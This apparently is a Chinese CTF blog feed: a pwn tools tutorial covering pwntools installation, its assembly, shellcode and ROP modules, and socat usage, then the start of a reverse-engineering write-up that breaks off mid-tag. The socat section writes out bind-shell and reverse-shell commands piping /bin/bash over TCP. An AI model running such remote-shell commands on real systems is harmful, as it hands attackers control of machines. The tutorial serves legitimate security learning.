        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Pwn是一个骇客语法的俚语词，自”own”这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如：”You just got pwned!”）。</p><p>在骇客行话里，尤其在另外一种电脑技术方面，包括电脑（服务器或个人电脑）、网站、闸道装置、或是应用程序，”pwn”在这一方面的意思是==攻破==（”to compromise”，危及、损害）或是==控制==（”to control”）。在这一方面的意义上，它与骇客入侵与破解是相同意思的。例如某一个外部团体已经取得未经公家许可的系统管理员控制权限，并利用这个权限骇入并入侵（”owned” 或是 “pwned”）</p><p>这里会详细介绍pwn的相关内容，以及学习中遇到的问题。<br>先把工具安装上：</p><p>1、安装Binutils</p> <pre class="prettyprint"><code class=" hljs lasso">git clone https:<span class="hljs-comment">//github.com/Gallopsled/pwntools-binutils</span>sudo apt<span class="hljs-attribute">-get</span> install software<span class="hljs-attribute">-properties</span><span class="hljs-attribute">-common</span>sudo apt<span class="hljs-attribute">-add</span><span class="hljs-attribute">-repository</span> ppa:pwntools/binutilssudo apt<span class="hljs-attribute">-get</span> updatesudo apt<span class="hljs-attribute">-get</span> install binutils<span class="hljs-attribute">-arm</span><span class="hljs-attribute">-linux</span><span class="hljs-attribute">-gnu</span></code></pre> <p>2、安装Capstone&#xff08;反汇编框架&#xff09;</p> <pre class="prettyprint"><code class=" hljs smalltalk">~<span class="hljs-char">$ </span>git clone <span class="hljs-method">https:</span>//github.com/aquynh/capstone~<span class="hljs-char">$ </span>cd capstone~<span class="hljs-char">$ </span>make~<span class="hljs-char">$ </span>sudo make install</code></pre> <p>3、安装pwntools</p> <pre class="prettyprint"><code class=" hljs lasso">~$ sudo apt<span class="hljs-attribute">-get</span> install libssl<span class="hljs-attribute">-dev</span>~$ sudo pip install pwntools<span class="hljs-comment">//这个直接打包安装所需要的库和框架了&#xff0c;不需要1、2步</span></code></pre> <p>安装完成后终端输入python进入其交互模式后&#xff0c;输入import pwn回车后没报错&#xff0c;差不多就好了</p> <pre class="prettyprint"><code class=" hljs python"><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pwn  <span class="hljs-prompt">&gt;&gt;&gt; </span>pwn.asm(<span class="hljs-string">&#34;xor eax,eax&#34;</span>)  <span class="hljs-string">&#39;1\xc0&#39;</span>//如果执行结果和上面相同&#xff0c;则说明安装成功&#xff0c;pwn模块现在可以使用了。</code></pre> 再来说一下，这几个东东是些什么：GNU binutils是一组二进制工具集。Capstone 是一个反汇编框架，希望成为在二进制分析和安全通讯反向工程的最棒工具。pwntools是一个CTF框架和漏洞利用开发库，用Python开发，旨在让使用者简单快速的编写exploit。补充一下：python的安装：（apt-get 安装）sudo apt-get install python-numpy  #python-numpy为软件包的名称其中，numpy为Python中的模块。这种安装方式有默认的安装路径。安装之前可能需要对apt-get进行更新。sudo apt-get update以上基本就安装好了！pip 是 Python 包管理工具，该工具提供了对Python 包的查找、下载、安装、卸载的功能。如果你还未安装，则可以使用以下方法来安装：$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py   # 下载安装脚本注意：用哪个版本的 Python 运行安装脚本，pip 就被关联到哪个版本，如果是 Python3 则执行以下命令：$ sudo python get-pip.py    # 运行安装脚本一般情况 pip 对应的是 Python 2.7，pip3 对应的是 Python 3.x。然后我们就可以下载一个pwn常用的工具了。pip3 install pwntoolspip2 install pwntools一个是python2版本的，还有个python3版本的。这两个版本最好都要安装好，虽然python2会渐渐淘汰，但还是没有被完全被淘汰。所以我们要两个都安装一下，防止我们用到了却没有安装的尴尬场景。<p>做题的时候思路为：</p><h5 id="1-查壳"><a href="#1-查壳" class="headerlink" title="1.查壳"></a>1.查壳</h5><p>当我们拿到一个pwn文件时，首先应当查壳。在ctf比赛中的pwn大多在Linux下，Linux下没有很强力的壳，一般都是upx格式的壳，所以可以在命令行中用upx -d file来进行脱壳操作。</p><h5 id="2-查看所使用的防护技术"><a href="#2-查看所使用的防护技术" class="headerlink" title="2.查看所使用的防护技术"></a>2.查看所使用的防护技术</h5><p>这个必不可少，因为我们需要知道一些基本信息来辅助我们判断。<br>接下来，我们可以用checksec脚本来查询该文件使用了哪些防护技术。<br>—c<br>./checksec –file file</p><hr><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p><h5 id="3、具体分析"><a href="#3、具体分析" class="headerlink" title="3、具体分析"></a>3、具体分析</h5><h2 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h2><h3 id="pwntools库"><a href="#pwntools库" class="headerlink" title="pwntools库"></a>pwntools库</h3><p>pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者==简单快速的编写exploit==。包含了==本地执行、远程连接读写、shellcode生成、ROP链的构建、ELF解析、符号泄露==等众多强大功能。</p><p><strong>安装&#xff1a;</strong></p> <p>1、安装Binutils</p> <pre class="prettyprint"><code class=" hljs lasso">git clone https:<span class="hljs-comment">//github.com/Gallopsled/pwntools-binutils</span>sudo apt<span class="hljs-attribute">-get</span> install software<span class="hljs-attribute">-properties</span><span class="hljs-attribute">-common</span>sudo apt<span class="hljs-attribute">-add</span><span class="hljs-attribute">-repository</span> ppa:pwntools/binutilssudo apt<span class="hljs-attribute">-get</span> updatesudo apt<span class="hljs-attribute">-get</span> install binutils<span class="hljs-attribute">-arm</span><span class="hljs-attribute">-linux</span><span class="hljs-attribute">-gnu</span></code></pre> <p>2、安装Capstone&#xff08;反汇编框架&#xff09;</p> <pre class="prettyprint"><code class=" hljs smalltalk">~<span class="hljs-char">$ </span>git clone <span class="hljs-method">https:</span>//github.com/aquynh/capstone~<span class="hljs-char">$ </span>cd capstone~<span class="hljs-char">$ </span>make~<span class="hljs-char">$ </span>sudo make install</code></pre> <p>3、安装pwntools</p> <pre class="prettyprint"><code class=" hljs lasso">~$ sudo apt<span class="hljs-attribute">-get</span> install libssl<span class="hljs-attribute">-dev</span>~$ sudo pip install pwntools<span class="hljs-comment">//这个直接打包安装所需要的库和框架了&#xff0c;不需要1、2步</span></code></pre> <p>安装完成后终端输入python进入其交互模式后&#xff0c;输入import pwn回车后没报错&#xff0c;差不多就好了</p> <pre class="prettyprint"><code class=" hljs python"><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pwn  <span class="hljs-prompt">&gt;&gt;&gt; </span>pwn.asm(<span class="hljs-string">&#34;xor eax,eax&#34;</span>)  <span class="hljs-string">&#39;1\xc0&#39;</span>//如果执行结果和上面相同&#xff0c;则说明安装成功&#xff0c;pwn模块现在可以使用了。</code></pre> <h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。</p><p>常用的模块有下面几个：</p><ul><li>==asm==:汇编与反汇编</li><li>==dynelf==:用于远程符号泄露，需要提供leak方法</li><li>==elf==:对elf文件进行操作</li><li>==gdb==:配合gdb进行调试</li><li>==memleak==:用于内存泄漏</li><li>==shellcraft==: shellcode的生成器</li><li>==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li><li>==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等</li></ul><h3 id="Tubes读写接口"><a href="#Tubes读写接口" class="headerlink" title="Tubes读写接口"></a>Tubes读写接口</h3><p>对于一次攻击而言前提就是与目标服务器或者程序进行交互。<br>无论哪种PIPE都是继承tube而来，可以用于读写函数主要有:</p><ul><li>interactive() ： 直接进行交互，相当于回到shell的模式，在取得shell之后使用</li><li>recv(numb = 4096,timeout = default)：接收指定字节</li><li>recvall() ： 一直接收知道EOF</li><li>recvline(keepends = True)： 接收一行，keepends为是否保留行尾的\n，默认为Ture</li><li>recvuntil((delims,drop=False)：一直读到delims的pattern出现为止</li><li>recvrepeat(timeout=default)： 持续接收知道EOF或者timeout</li><li>send(data) ：发送数据</li><li>sendline(data) : 发送一行数据，相当于在数据末尾加\n</li></ul><h3 id="汇编与反汇编"><a href="#汇编与反汇编" class="headerlink" title="汇编与反汇编"></a>汇编与反汇编</h3><p>使用asm来进行汇编</p> <pre class="prettyprint"><code class=" hljs tex">&gt;&gt;&gt; asm(&#39;mov eax, 0&#39;)&#39;<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00&#39;&gt;&gt;&gt; asm(&#39;mov eax, SYS_execve&#39;)&#39;<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>0b<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00&#39;&gt;&gt;&gt; asm(shellcraft.nop())&#39;<span class="hljs-command">\x</span>90&#39;</code></pre> <p>可以使用context来指定cpu类型以及操作系统</p> <pre class="prettyprint"><code class=" hljs python"><span class="hljs-prompt">&gt;&gt;&gt; </span>context.arch      &#61; <span class="hljs-string">&#39;i386&#39;</span><span class="hljs-prompt">&gt;&gt;&gt; </span>context.os        &#61; <span class="hljs-string">&#39;linux&#39;</span><span class="hljs-prompt">&gt;&gt;&gt; </span>context.endian    &#61; <span class="hljs-string">&#39;little&#39;</span><span class="hljs-prompt">&gt;&gt;&gt; </span>context.word_size &#61; <span class="hljs-number">32</span></code></pre> <p>注意&#xff1a;Any arguments/properties that can be set on context</p> <pre class="prettyprint"><code class=" hljs lua">&gt;&gt;&gt; asm(<span class="hljs-string">&#34;mov eax, SYS_select&#34;</span>, arch &#61; <span class="hljs-string">&#39;i386&#39;</span>, <span class="hljs-built_in">os</span> &#61; <span class="hljs-string">&#39;freebsd&#39;</span>)<span class="hljs-string">&#39;\xb8]\x00\x00\x00&#39;</span>&gt;&gt;&gt; asm(<span class="hljs-string">&#34;mov eax, SYS_select&#34;</span>, arch &#61; <span class="hljs-string">&#39;amd64&#39;</span>, <span class="hljs-built_in">os</span> &#61; <span class="hljs-string">&#39;linux&#39;</span>)<span class="hljs-string">&#39;\xb8\x17\x00\x00\x00&#39;</span>&gt;&gt;&gt; asm(<span class="hljs-string">&#34;mov rax, SYS_select&#34;</span>, arch &#61; <span class="hljs-string">&#39;amd64&#39;</span>, <span class="hljs-built_in">os</span> &#61; <span class="hljs-string">&#39;linux&#39;</span>)<span class="hljs-string">&#39;H\xc7\xc0\x17\x00\x00\x00&#39;</span>&gt;&gt;&gt; asm(<span class="hljs-string">&#34;mov r0, #SYS_select&#34;</span>, arch &#61; <span class="hljs-string">&#39;arm&#39;</span>, <span class="hljs-built_in">os</span> &#61; <span class="hljs-string">&#39;linux&#39;</span>, bits&#61;<span class="hljs-number">32</span>)<span class="hljs-string">&#39;R\x00\xa0\xe3&#39;</span></code></pre> <p>使用disasm进行反汇编&#xff08;同样可以指定cpu类型&#xff09;</p> <pre class="prettyprint"><code class=" hljs python"><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;6a0258cd80ebf9&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>))   <span class="hljs-number">0</span>:   <span class="hljs-number">6</span>a <span class="hljs-number">02</span>                   push   <span class="hljs-number">0x2</span>   <span class="hljs-number">2</span>:   <span class="hljs-number">58</span>                      pop    eax   <span class="hljs-number">3</span>:   cd <span class="hljs-number">80</span>                   int    <span class="hljs-number">0x80</span>   <span class="hljs-number">5</span>:   eb f9                   jmp    <span class="hljs-number">0x0</span><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;b85d000000&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;i386&#39;</span>)   <span class="hljs-number">0</span>:   b8 <span class="hljs-number">5</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    eax,<span class="hljs-number">0x5d</span><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;b85d000000&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;i386&#39;</span>, byte &#61; <span class="hljs-number">0</span>)   <span class="hljs-number">0</span>:   mov    eax,<span class="hljs-number">0x5d</span><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;b85d000000&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;i386&#39;</span>, byte &#61; <span class="hljs-number">0</span>, offset &#61; <span class="hljs-number">0</span>)mov    eax,<span class="hljs-number">0x5d</span><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;b817000000&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;amd64&#39;</span>)   <span class="hljs-number">0</span>:   b8 <span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    eax,<span class="hljs-number">0x17</span><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;48c7c017000000&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;amd64&#39;</span>)   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> c7 c0 <span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    mov    rax,<span class="hljs-number">0x17</span><span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;04001fe552009000&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;arm&#39;</span>)   <span class="hljs-number">0</span>:   e51f0004        ldr     r0, [pc, <span class="hljs-comment">#-4]   ; 0x4</span>   <span class="hljs-number">4</span>:   <span class="hljs-number">00900052</span>        addseq  r0, r0, r2, asr r0<span class="hljs-prompt">&gt;&gt;&gt; </span><span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#39;4ff00500&#39;</span>.decode(<span class="hljs-string">&#39;hex&#39;</span>), arch &#61; <span class="hljs-string">&#39;thumb&#39;</span>, bits&#61;<span class="hljs-number">32</span>)   <span class="hljs-number">0</span>:   f04f <span class="hljs-number">0005</span>       mov.w   r0, <span class="hljs-comment">#5</span></code></pre> <h3 id="shellcode生成器"><a href="#shellcode生成器" class="headerlink" title="shellcode生成器"></a>shellcode生成器</h3><p>使用shellcraft可以生成对应架构的shellcode代码，直接使用链式调用的方法就可以得到。<br>除了直接执行sh之外，还可以进行其他的一些常用操作如提权、反向链接等。<br>可以在网上找到一些资源下载。</p><p>还有一些如：ELF文件操作。<br>这些我现在还用不到，</p><p><strong>ROP链生成器&#xff1a;</strong></p> <p>先简单回顾一下&#61;&#61;ROP的原理&#61;&#61;&#xff0c;由于NX开启不能在栈上执行shellcode&#xff0c;我们可以在栈上布置一系列的返回地址与参数&#xff0c;这样可以进行多次的函数调用&#xff0c;通过函数尾部的ret语句控制程序的流程&#xff0c;而用程序中的一些pop/ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上/bin/sh&#xff0c;覆盖程序中某个函数的GOT为system的&#xff0c;然后ret到那个函数的plt就可以触发system(‘/bin/sh’)。由于是利用ret指令的exploit&#xff0c;所以叫Return-Oriented Programming。&#xff08;如果没有开启ASLR&#xff0c;可以直接使用ret2libc技术&#xff09;</p> <p>好&#xff0c;这样来看&#xff0c;这种技术的难点自然就是如何在栈上布置返回地址以及函数参数了。而ROP模块的作用&#xff0c;就是自动地寻找程序里的gadget&#xff0c;自动在栈上部署对应的参数。</p> <pre class="prettyprint"><code class=" hljs tex">elf &#61; ELF(&#39;ropasaurusrex&#39;)rop &#61; ROP(elf)rop.read(0, elf.bss(0x80))rop.dump()<span class="hljs-special">#</span> <span class="hljs-special">[</span>&#39;0x0000:        0x80482fc (read)&#39;,<span class="hljs-special">#</span>  &#39;0x0004:       0xdeadbeef&#39;,<span class="hljs-special">#</span>  &#39;0x0008:              0x0&#39;,<span class="hljs-special">#</span>  &#39;0x000c:        0x80496a8&#39;<span class="hljs-special">]</span>str(rop)<span class="hljs-special">#</span> &#39;<span class="hljs-command">\xfc</span><span class="hljs-command">\x</span>82<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xef</span><span class="hljs-command">\xbe</span><span class="hljs-command">\xad</span><span class="hljs-command">\xde</span><span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\xa</span>8<span class="hljs-command">\x</span>96<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08&#39;</code></pre> <p>使用ROP(elf)来产生一个rop的对象&#xff0c;这时rop链还是空的&#xff0c;需要在其中添加函数</p> <p>因为ROP对象实现了<strong>getattr</strong>的功能&#xff0c;可以直接通过func call的形式来添加函数&#xff0c;rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。</p> <p>通过多次添加函数调用&#xff0c;最后使用str将整个rop chain dump出来就可以了。</p> <ul><li>call(resolvable, arguments&#61;()) : 添加一个调用&#xff0c;resolvable可以是一个符号&#xff0c;也可以是一个int型地址&#xff0c;注意后面的参数必须是元组否则会报错&#xff0c;即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li><li>chain() : 返回当前的字节序列&#xff0c;即payload</li><li>dump() : 直观地展示出当前的rop chain</li><li>raw() : 在rop chain中加上一个整数或字符串</li><li>search(move&#61;0, regs&#61;None, order&#61;’size’) : 按特定条件搜索gadget&#xff0c;没仔细研究过</li><li>unresolve(value) : 给出一个地址&#xff0c;反解析出符号</li></ul> <h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>Socat是Linux下的一个多功能的网络工具，可以看做是netcat的N倍加强版。它的主要特点就是在两个数据流之间建立通道，且支持众多协议和连接方式：ip,tcp,udp,ipv6,pipe,exec,system,open,proxy,openssl,socket等。</p><p><strong>安装</strong></p> <p>Ubuntu上可以直接</p> <pre class="prettyprint"><code class=" hljs bash"><span class="hljs-built_in">sudo</span> apt-get install socat</code></pre> <p><strong>使用</strong></p> <p>基本语法&#xff1a;</p> <pre class="prettyprint"><code class=" hljs xml">socat [options] <span class="hljs-tag">&lt;<span class="hljs-title">address</span>&gt;</span>　<span class="hljs-tag">&lt;<span class="hljs-title">address</span>&gt;</span></code></pre> <p>&#xff08;其工作过程是单步执行的&#xff0c;先打开第一个连接再打开第二个连接&#xff0c;如果第一个连接打开失败则终止。&#xff09;</p> <p>几个常用的[options]方式如下&#xff1a;</p> <pre class="prettyprint"><code class=" hljs haml">-<span class="ruby">,<span class="hljs-constant">STDIN</span>,<span class="hljs-constant">STDOUT</span> &#xff1a;表示标准输入输出&#xff0c;可以就用一个横杠代替&#xff0c;这个就不用多说了吧….</span><span class="hljs-comment">/var/log/syslog : 也可以是任意路径&#xff0c;如果是相对路径要使用./&#xff0c;打开一个文件作为数据流。</span>TCP:: : 建立一个TCP连接作为数据流&#xff0c;TCP也可以替换为UDPTCP-LISTEN: : 建立TCP监听端口&#xff0c;TCP也可以替换为UDPEXEC: : 执行一个程序作为数据流。</code></pre> <h5 id="当cat使用">当cat使用&#xff1a;</h5> <ol><li>直接回显&#xff1a;</li></ol> <pre class="prettyprint"><code class=" hljs ">socat - - </code></pre> <ol><li>cat文件&#xff1a;</li></ol> <pre class="prettyprint"><code class=" hljs ruby">socat - <span class="hljs-regexp">/home/usr</span><span class="hljs-regexp">/chuck </span></code></pre> <ol><li>写文件&#xff1a;</li></ol> <pre class="prettyprint"><code class=" hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#34;hello&#34;</span> | socat - /home/user/chuck</code></pre> <h5 id="当netcat使用">当netcat使用&#xff1a;</h5> <p>　 <br /> 1. 连接远程端口</p> <pre class="prettyprint"><code class=" hljs css"><span class="hljs-tag">nc</span> <span class="hljs-tag">localhost</span> 80<span class="hljs-tag">socat</span> <span class="hljs-tag">-</span> <span class="hljs-tag">TCP</span><span class="hljs-pseudo">:localhost</span><span class="hljs-pseudo">:80</span><span class="hljs-comment">/*这两个命令等同&#xff0c;在socat里必须有两个流&#xff0c;所以第一个参数-代表标准的输入输出&#xff0c;第二个流连接到localhost的80端口*/</span></code></pre> <p>2.监听端口</p> <pre class="prettyprint"><code class=" hljs lasso">nc <span class="hljs-attribute">-lp</span> localhost <span class="hljs-number">700</span>socat TCP<span class="hljs-attribute">-LISTEN</span>:<span class="hljs-number">700</span> <span class="hljs-subst">-</span><span class="hljs-comment">/*这两个命令等同*/</span></code></pre> <p>3.正向shell</p> <pre class="prettyprint"><code class=" hljs ruby">nc -lp localhost <span class="hljs-number">700</span> -e /bin/bashsocat <span class="hljs-constant">TCP</span>-<span class="hljs-constant">LISTEN</span><span class="hljs-symbol">:</span><span class="hljs-number">700</span> <span class="hljs-constant">EXEC</span><span class="hljs-symbol">:/bin/bash</span>/*这两个命令等同,这个命令把/bin/bash绑定到端口<span class="hljs-number">700</span>*<span class="hljs-regexp">/</span></code></pre> <p>4.反弹shell</p> <pre class="prettyprint"><code class=" hljs lasso">nc localhost <span class="hljs-number">700</span> <span class="hljs-attribute">-e</span> /bin/bashsocat tcp<span class="hljs-attribute">-connect</span>:localhost:<span class="hljs-number">700</span> exec:<span class="hljs-string">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane<span class="hljs-comment">/*这两个命令等同*/</span></code></pre> <h5 id="代理与转发">代理与转发&#xff1a;</h5> <pre class="prettyprint"><code class=" hljs css"> <span class="hljs-tag">socat</span> <span class="hljs-tag">TCP-LISTEN</span><span class="hljs-pseudo">:80</span>,<span class="hljs-tag">fork</span> <span class="hljs-tag">TCP</span><span class="hljs-pseudo">:www</span><span class="hljs-class">.domain</span><span class="hljs-class">.org</span><span class="hljs-pseudo">:80</span> <span class="hljs-comment">/*本地监听80端口&#xff0c;来自80端口的连接重定向到目标www.domain.org:80&#xff0c;fork参数是需要使用并发连接*/</span></code></pre> <h5 id="通过openssl来加密传输过程">通过openssl来加密传输过程&#xff1a;</h5> <p>1、首先生成证书</p> <pre class="prettyprint"><code class=" hljs lasso">FILENAME<span class="hljs-subst">&#61;</span>server openssl genrsa <span class="hljs-attribute">-out</span><span class="hljs-variable">$FILENAME.key</span> <span class="hljs-number">1024</span>openssl req <span class="hljs-attribute">-new</span> <span class="hljs-attribute">-key</span> <span class="hljs-variable">$FILENAME.key</span> <span class="hljs-attribute">-x509</span> <span class="hljs-attribute">-days</span> <span class="hljs-number">3653</span> <span class="hljs-attribute">-out</span> <span class="hljs-variable">$FILENAME.crtcat</span> <span class="hljs-variable">$FILENAME.key</span> <span class="hljs-variable">$FILENAME.crt</span> <span class="hljs-subst">&gt;</span><span class="hljs-variable">$FILENAME.pem</span> <span class="hljs-comment">/*在当前目录下生成server.pem server.crt*/</span></code></pre> <p>2、使用</p> <pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-comment">/*在服务器端*/</span>socat OPENSSL-LISTEN:<span class="hljs-number">443</span>,cert&#61;/cert<span class="hljs-preprocessor">.pem</span> -<p><span class="hljs-comment">/<em>在本地</em>/</span><br>socat - OPENSSL:localhost:<span class="hljs-number">443</span></code></pre> </p><h3 id="fork服务器"><a href="#fork服务器" class="headerlink" title="fork服务器"></a>fork服务器</h3><p>这个是关键功能，可以将一个使用标准输入输出的单进程程序变为一个使用fork方法的多进程服务。非常方便.</p><pre class="prettyprint"><code class=" hljs perl">socat TCP-LISTEN:<span class="hljs-number">1234</span>,reuseaddr,<span class="hljs-keyword">fork</span> EXEC:./helloworld/*TCP-LISTEN&#xff1a;在本地建立的是一个TCP协议的监听端口reuseaddr:绑定本地一个端口<span class="hljs-keyword">fork</span>:设定多链接模式&#xff0c;即当一个链接被建立后&#xff0c;自动复制一个同样的端口再进行监听<span class="hljs-variable">*/</span></code></pre> <h5 id="端口映射">端口映射&#xff1a;</h5> <p>这是一个广泛使用的功能&#xff0c;在一个NAT环境&#xff0c;如何从外部连接到内部的一个端口呢&#xff1f;只要能在内部运行socart就行了。 <br /> 外部&#xff1a;</p> <pre class="prettyprint"><code class=" hljs css"><span class="hljs-tag">socat</span> <span class="hljs-tag">tcp-listen</span><span class="hljs-pseudo">:1234</span> <span class="hljs-tag">tcp-listen</span><span class="hljs-pseudo">:3389</span></code></pre> <p>内部&#xff1a;</p> <pre class="prettyprint"><code class=" hljs nginx"><span class="hljs-title">socat</span> tcp:outerhost:<span class="hljs-number">1234</span> tcp:<span class="hljs-number">192.168.12.34:3389</span>//这样&#xff0c;外部机器上的<span class="hljs-number">3389</span>就映射在内部网<span class="hljs-number">192.168.12.34</span>的<span class="hljs-number">3389</span>端口上了</code></pre> <h3 id="ZIO"><a href="#ZIO" class="headerlink" title="ZIO"></a>ZIO</h3><p>用python编写的用于pwning开发的统一io库。<br>zio是一个易于使用的pwning开发io库，支持本地进程pwning和tcp套接字io的统一接口。</p><p>zio的主要目标是在进程stdin/stdout和tcp套接字io之间提供统一的io接口。因此，在完成本地pwning开发后，只需将io目标更改为远程服务器上的pwn。<br>以上是官方的解释，不错不错！！！</p><p>现在介绍到这儿了，不在过多介绍了，因为再介绍我也不会了，到时候再练几道题，以题讲解知识点！！！</p><p>望诸君共勉！</p><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1804859533&auto=1&height=66"></iframe> </div><!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界reverse新手题</title>
      <link href="posts/886d7a79/"/>
      <url>posts/886d7a79/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><hr /><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之所以写这些题解，有几点原因，一是怕自己忘记（防止自己忘掉，就算忘掉也有复习的东西，别到时候连看的都没有）。二是，想与诸君共勉，同时给后来者提供一些微薄之力。</p><hr /><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p>刚开始都比较简单（简单的题一般是不加壳的）<br><img src="https://img-blog.csdnimg.cn/20201222201456964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接用ida打开搜索字符串就看到了flag了（很简单了）</p><hr /><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><p><img src="https://img-blog.csdnimg.cn/20201222202313688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>它说事py交易，我们可以想到python的pyc反编译，那去网上找找在线工具，就能看到源代码了：<br><img src="https://img-blog.csdnimg.cn/20201222202453354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样可以看到它的逻辑，它有个加密，那我们就逆加解密呗。<br><img src="https://img-blog.csdnimg.cn/20201222203110999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>打开运行出现如下：<br><img src="https://img-blog.csdnimg.cn/20201222203240582.png" alt="在这里插入图片描述"><br>常规操作，用ida打开，搜索字符串，发现flag了，那就进行跳转转到伪代码<br><img src="https://img-blog.csdnimg.cn/20201222203421997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如下：<br><img 